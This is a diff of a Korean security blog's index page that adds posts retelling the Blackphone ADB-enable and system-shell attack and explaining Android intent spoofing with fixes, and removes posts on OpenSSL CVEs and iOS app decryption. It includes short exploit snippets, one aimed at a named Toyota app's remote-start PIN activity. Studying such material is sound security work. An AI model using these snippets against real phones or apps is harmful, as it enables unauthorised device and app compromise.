@@ -9,8 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="Mac의 경우 brew install qemu 로 qumu 가상 머신을 설치. qemu-system-i386 사용.
-debian 기반 linux 이미지 https://people.debian.org/~aurel32/qemu/i386/ &hellip;">
+  <meta name="description" content="Justin Case 의 작업 Blackphone goes to Def Con and gets hacked &ndash;sort of 을 따라가보자. Step 1: ADB 활성화 블랙폰은 ADB 접속이 disable 된 채로 판매되는데, apk 를 인스톨하고 실행해서 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -66,6 +65,192 @@ debian 기반 linux 이미지 https://people.debian.org/~aurel32/qemu/i386/ &hel
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/08/13/blackphone-goes-to-def-con-and-gets-hacked-sort-of/">Blackphone Goes to Def Con and Gets Hacked</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-08-13T15:29:48+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>3:29 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Justin Case 의 작업 <a href="http://arstechnica.com/security/2014/08/blackphone-goes-to-def-con-and-gets-hacked-sort-of/">Blackphone goes to Def Con and gets hacked &ndash;sort of</a> 을 따라가보자.</p>
+
+<h4>Step 1: ADB 활성화</h4>
+
+<p>블랙폰은 ADB 접속이 disable 된 채로 판매되는데, apk 를 인스톨하고 실행해서 enable 시킨다. <code>com.android.settings.Settings$DevelopmentSettingsActivity</code> 을 인텐트로 보낸다.</p>
+
+<pre><code>public class MainActivity extends Activity
+{
+  protected void onCreate(Bundle paramBundle)
+  {
+    super.onCreate(paramBundle);
+    ComponentName localComponentName = new ComponentName("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsActivity");
+    Intent localIntent = new Intent("android.intent.action.MAIN");
+    localIntent.setComponent(localComponentName);
+    startActivity(localIntent);
+    finish();
+  }
+}
+</code></pre>
+
+<h4>Step 2: system 권한 획득</h4>
+
+<p>이제 ADB 액세스를 얻었다. <code>remotewipe</code> app 이 system 으로 돌고 있고, debuggable 하다. jdb 를 붙여서 <code>system</code> 권한의 쉘을 떨어뜨렸다고 한다. How-to 는 saurik 의 글을 참조 (<a href="http://www.saurik.com/id/17">http://www.saurik.com/id/17</a>)</p>
+
+<pre><code>$ axml AndroidManifest.xml
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;manifest
+    xmlns:android="http://schemas.android.com/apk/res/android"
+    android:shareUserId="android.uid.system"
+    android:versionCode="6"
+    android:versionName="0.8.2"
+    package="com.karumi.blackphone.wipe"
+    &gt;
+
+&lt;application
+    ...
+    android:debuggable="true"
+    android:allowBackup="false"
+    &gt;
+</code></pre>
+
+<h4>Step 3: Privilege Escalation</h4>
+
+<p>(Justin Case 는) 아직 공개하지 않은 버그를 이용해 <code>system</code> -> <code>root</code> 으로 올렸다고 한다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/08/06/intent-spoofing-on-android/">Intent Spoofing on Android</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-08-06T15:37:16+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>6</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>3:37 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><ul>
+<li><a href="http://pwntest.wordpress.com/2012/11/17/168935099/">FourGoats Vulnerabilities: Intent Spoofing</a></li>
+<li><a href="http://blog.palominolabs.com/2013/05/13/android-security/">Intent Spoofing on Android</a></li>
+<li><a href="http://www.slideshare.net/mrtompa/android-app-security-what-not-to-do/">Android App Security: What (not) to do!</a></li>
+</ul>
+
+
+<h4>Action</h4>
+
+<p>Intent spoofing 에 취약한 App 을 exploit 하는 것은 다음 코드와 같다. <code>startActivityForResult()</code> 로 인텐트를 날린다.</p>
+
+<pre><code>protected void onCreate(Bundle paramBundle)
+{
+    super.onCreate(paramBundle);
+    setContentView(2130903063);
+    Intent localIntent = new Intent();
+    localIntent.putExtra("galleryFlowID", 100);
+    localIntent.putExtra("carowner", "suzuki");
+    localIntent.putExtra("Intent_new_title", "Toyota");
+    localIntent.setComponent(new ComponentName("com.toyota.tconnect", "com.toyota.tconnect.RemoteStartPINActivity"));
+    startActivityForResult(localIntent, 0);
+}
+</code></pre>
+
+<h4>Intent spoofing</h4>
+
+<p>이런 취약점이 발생하는 이유는, 인텐트 receiver 를 정의할때, 퍼미션 세팅을 안했기때문.</p>
+
+<pre><code>&lt;receiver android:name="one.special.receiver"&gt;
+  &lt;intent-filter&gt;
+    &lt;action android:name="one.intent.action" /&gt;
+  &lt;/intent-filter&gt;
+&lt;/receiver&gt;
+</code></pre>
+
+<ul>
+<li>Public components and senders with weak permissions</li>
+<li>Malicious app sends Intent resulting in data injection or state change</li>
+</ul>
+
+
+<h4>Intent spoofing 방지</h4>
+
+<pre><code>&lt;receiver android:name="one.special.receiver" 
+            android:exported=false&gt;
+  &lt;intent-filter&gt;
+    &lt;action android:name="one.intent.action" /&gt;
+  &lt;/intent-filter&gt;
+&lt;/receiver&gt;
+
+&lt;receiver android:name="one.special.receiver" 
+            android:exported=false
+            android:permission="one.permission"&gt;
+  &lt;intent-filter&gt;
+    &lt;action android:name="one.intent.action" /&gt;
+  &lt;/intent-filter&gt;
+&lt;/receiver&gt;
+</code></pre>
+
+<h4>Unauthorized Intent Receipt</h4>
+
+<p>인텐트를 다음과 같이 보내면 안된다.</p>
+
+<pre><code>Intent intent = new Intent();
+intent.setAction("a.special.action");
+startActivity(intent);
+</code></pre>
+
+<ul>
+<li>Given a public Intent which doesn&rsquo;t require strong permission in the receiving component</li>
+<li>Intercepted by malicious app</li>
+<li>May leak sensitive data and/or change in control flow</li>
+</ul>
+
+
+<p>좋은 예</p>
+
+<pre><code>Intent fixedIntent = new Intent();
+fixedIntent.setClassName("pkg.name","pkg.name.DestinationName");
+
+Intent fixedIntent2 = new Intent();
+fixedIntent2.setAction("a.special.action");
+sendBroadcast(fixedIntent2, "a.special.permission");
+</code></pre>
+
+<p>위와 같이 보내는 것이 좋다.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -591,128 +776,6 @@ further ChangeCipherSpec messages will regenerate the expected Finished hash, bu
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/06/20/recent-openssl-vulnerabilities/">Recent OpenSSL Vulnerabilities</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-06-20T10:36:24+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>10:36 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><h4><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224">CVE-2014-0224 a.k.a ChangeCipherSpec</a></h4>
-
-<p>OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h does not properly restrict processing of ChangeCipherSpec messages, which allows man-in-the-middle attackers to trigger use of a zero-length master key in certain OpenSSL-to-OpenSSL communications, and consequently hijack sessions or obtain sensitive information, via a crafted TLS handshake, aka the &ldquo;CCS Injection&rdquo; vulnerability.</p>
-
-<ul>
-<li><a href="http://ccsinjection.lepidum.co.jp/blog/2014-06-05/CCS-Injection-en/index.html">How I discovered CCS Injection Vulnerability (CVE-2014-0224)</a></li>
-<li><a href="https://gist.github.com/rcvalle/71f4b027d61a78c42607">ccsinjection.c</a></li>
-<li><a href="https://gist.github.com/rcvalle/585e12e4d5d3b658cd3d">ccsinjection_server.c</a></li>
-</ul>
-
-
-<h4><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0221">CVE-2014-0221</a></h4>
-
-<p>The dtls1_get_message_fragment function in d1_both.c in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h allows remote attackers to cause a denial of service (recursion and client crash) via a DTLS hello message in an invalid DTLS handshake.</p>
-
-<h4><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0195">CVE-2014-0195</a></h4>
-
-<p>The dtls1_reassemble_fragment function in d1_both.c in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h does not properly validate fragment lengths in DTLS ClientHello messages, which allows remote attackers to execute arbitrary code or cause a denial of service (buffer overflow and application crash) via a long non-initial fragment.</p>
-
-<ul>
-<li><a href="http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/ZDI-14-173-CVE-2014-0195-OpenSSL-DTLS-Fragment-Out-of-Bounds/ba-p/6501002#.U5ER15SSyYl">ZDI-14-173/CVE-2014-0195 - OpenSSL DTLS Fragment Out-of-Bounds Write: Breaking up is hard to do</a></li>
-</ul>
-
-
-<h4><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160">CVE-2014-0160 a.k.a HeartBleed</a></h4>
-
-<p>The (1) TLS and (2) DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, as demonstrated by reading private keys, related to d1_both.c and t1_lib.c, aka the Heartbleed bug.</p>
-
-<ul>
-<li><a href="http://heartbleed.com/">HeartBleed.com</a></li>
-</ul>
-
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/06/20/decrypting-ios-apps/">Decrypting iOS Apps</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-06-20T10:22:20+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>10:22 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><a href="http://www.infointox.net/?p=114">Decrypting iOS Apps</a></p>
-
-<p>evasi0n 으로 iPod 를 Jailbreak 했다.</p>
-
-<p>openssh 패키지를 설치하고, <code>ssh root@XXX.XXX.XXX.XXX</code> 로 접속했다.
-그리고, <code>root</code> 와 <code>mobile</code> 의 password 를 세팅하였다.</p>
-
-<h4>Extract the application</h4>
-
-<p><code>/private/var/mobile/Applications/</code> 에서 타겟을 담고 있는 디렉토리를 찾았다.</p>
-
-<p><code>/private/var/mobile/Application/D411A4CE-B33E-4EFE-9041-E356718123EE/OM1X.app/OM1X</code> 가 찾는 바이너리.</p>
-
-<p>scp 로 OM1X 를 가져온다.</p>
-
-<pre><code># otool -arch all -Vh OM1X
-OM1X:
-Mach header
-      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
-   MH_MAGIC     ARM          9  0x00     EXECUTE    33       4056   NOUNDEFS DYLDLINK TWOLEVEL BINDS_TO_WEAK PIE
-</code></pre>
-
-<h4>Find encrypted area</h4>
-
-<p>이제 암호화된 부분을 찾아야 한다.</p>
-
-<pre><code># otool -arch all -Vl TM1G | grep -A5 LC_ENCRYP
-          cmd LC_ENCRYPTION_INFO
-      cmdsize 20
- cryptoff  16384
- cryptsize 819200
- cryptid   1
-Load command 12
-</code></pre>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/16">&larr; Older</a>
@@ -730,6 +793,14 @@ Load command 12
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/08/24/rc4-weakness/">RC4 Weakness</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/07/06/cve-2016-2434/">CVE-2016-2434</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/07/02/aes-in-python/">AES in Python</a>
       </li>
     
@@ -739,14 +810,6 @@ Load command 12
     
       <li class="post">
         <a href="/blog/2016/06/17/cve-2016-0728/">CVE-2016-0728</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/06/14/the-poisoned-nul-byte/">The Poisoned NUL Byte</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/06/14/plaidctf-ctf-2015-plaiddb/">PlaidCTF CTF 2015: PlaidDB</a>
       </li>
     
   </ul>
